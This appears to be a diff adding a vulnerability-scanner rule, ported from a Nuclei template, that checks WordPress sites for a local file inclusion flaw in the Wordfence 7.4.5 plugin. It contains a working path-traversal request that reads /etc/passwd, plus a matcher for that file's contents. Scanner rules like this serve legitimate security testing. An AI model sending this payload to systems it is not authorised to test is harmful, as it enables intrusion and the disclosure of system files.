@@ -1,0 +1,30 @@
+schema_version: 1
+id: "cortex.community:wordpress-wordfence-lfi"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "WordPress Wordfence 7.4.5 - Local File Inclusion"
+  description: "WordPress Wordfence 7.4.5 is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://www.exploit-db.com/exploits/48061"
+    - "https://www.nmmapper.com/st/exploitdetails/48061/42367/wordpress-plugin-wordfence745-local-file-disclosure/"
+  cwes: [22]
+  tags: ["wordpress", "wp-plugin", "lfi", "wordfence", "edb", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/wp-content/plugins/wordfence/lib/wordfenceClass.php?file=/../../../../../../etc/passwd" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0:" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
